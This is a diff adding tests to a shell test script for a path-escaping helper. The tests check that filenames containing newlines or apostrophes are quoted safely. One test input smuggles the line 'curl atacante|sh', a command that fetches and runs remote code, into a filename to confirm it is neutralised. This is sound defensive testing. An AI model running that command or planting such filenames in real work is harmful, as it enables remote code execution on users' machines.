@@ -84,6 +84,12 @@ check "every character a shell reads is escaped, nothing else is" \
 /tab\\$(printf '\t')here
 /ação\\ é.png
 /a\\ b /c" "$ESCAPED"
+# A name with a newline would run its second line in a shell without protected paste: quoted instead.
+check "a newline in a name is quoted, not escaped" "'/x
+curl atacante|sh
+.png'" "$("$WORK/escape" $'/x\ncurl atacante|sh\n.png' | head -3)"
+check "and an apostrophe in such a name is closed and reopened" "'/it'\\''s
+x'" "$("$WORK/escape" $'/it\'s\nx' | head -2)"
 
 # ------------------------------------------------------------ the app
 export KEEP_SOCKET=$SOCKET
